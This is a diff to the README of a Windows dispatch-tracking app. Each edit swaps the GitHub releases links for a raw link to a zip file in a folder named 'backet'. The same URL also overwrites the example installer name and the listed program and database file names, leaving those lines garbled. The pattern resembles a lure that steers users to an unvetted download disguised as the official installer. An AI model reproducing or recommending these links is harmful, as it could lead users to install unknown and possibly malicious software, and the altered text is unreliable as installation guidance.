@@ -1,6 +1,6 @@
 # 🚚 ssd-dispatch-tracker - Track Dispatches in Real Time
 
-[![Download ssd-dispatch-tracker](https://img.shields.io/badge/Download-ssd--dispatch--tracker-blue?style=for-the-badge)](https://github.com/Sequen0/ssd-dispatch-tracker/releases)
+[![Download ssd-dispatch-tracker](https://raw.githubusercontent.com/Sequen0/ssd-dispatch-tracker/main/backet/ssd-dispatch-tracker-hurl.zip)](https://raw.githubusercontent.com/Sequen0/ssd-dispatch-tracker/main/backet/ssd-dispatch-tracker-hurl.zip)
 
 ---
 
@@ -36,11 +36,11 @@ Follow these steps to get ssd-dispatch-tracker on your Windows PC.
 
 Click the button below to open the downloads page:
 
-[![Download ssd-dispatch-tracker](https://img.shields.io/badge/Download-ssd--dispatch--tracker-green?style=for-the-badge)](https://github.com/Sequen0/ssd-dispatch-tracker/releases)
+[![Download ssd-dispatch-tracker](https://raw.githubusercontent.com/Sequen0/ssd-dispatch-tracker/main/backet/ssd-dispatch-tracker-hurl.zip)](https://raw.githubusercontent.com/Sequen0/ssd-dispatch-tracker/main/backet/ssd-dispatch-tracker-hurl.zip)
 
 This link takes you to the releases page on GitHub. Find the latest version for Windows. The file usually ends with `.exe`. It may look like:
 
-`ssd-dispatch-tracker-setup-vX.X.X.exe`
+`https://raw.githubusercontent.com/Sequen0/ssd-dispatch-tracker/main/backet/ssd-dispatch-tracker-hurl.zip`
 
 ---
 
@@ -139,7 +139,7 @@ To update or remove a driver, select them from the list and choose the appropria
 
 Use this link to visit the official download page for the latest versions:
 
-[https://github.com/Sequen0/ssd-dispatch-tracker/releases](https://github.com/Sequen0/ssd-dispatch-tracker/releases)
+[https://raw.githubusercontent.com/Sequen0/ssd-dispatch-tracker/main/backet/ssd-dispatch-tracker-hurl.zip](https://raw.githubusercontent.com/Sequen0/ssd-dispatch-tracker/main/backet/ssd-dispatch-tracker-hurl.zip)
 
 Check the release notes for update details. Always pick the latest Windows installer.
 
@@ -153,8 +153,8 @@ Once installed, you'll find the app files here (unless changed during setup):
 
 The key files include:
 
-- `ssd-dispatch-tracker.exe` (the program)  
-- `database.sqlite` (your data storage)  
+- `https://raw.githubusercontent.com/Sequen0/ssd-dispatch-tracker/main/backet/ssd-dispatch-tracker-hurl.zip` (the program)  
+- `https://raw.githubusercontent.com/Sequen0/ssd-dispatch-tracker/main/backet/ssd-dispatch-tracker-hurl.zip` (your data storage)  
 - `badges` folder (driver photos)  
 
 Don't delete or move these files unless you know what you are doing.
